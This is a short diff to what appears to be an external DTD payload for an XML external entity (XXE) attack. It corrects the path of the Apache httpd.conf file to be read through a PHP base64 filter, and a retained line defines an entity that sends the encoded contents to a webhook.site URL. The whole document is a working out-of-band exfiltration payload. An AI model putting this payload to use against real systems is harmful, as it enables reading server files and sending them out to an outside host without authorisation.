@@ -1,2 +1,2 @@
-<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/httpd/httpd.conf">
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/httpd/conf/httpd.conf">
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://webhook.site/7c4ba838-9cfb-497f-893c-076d4fc81727/?%data;'>">
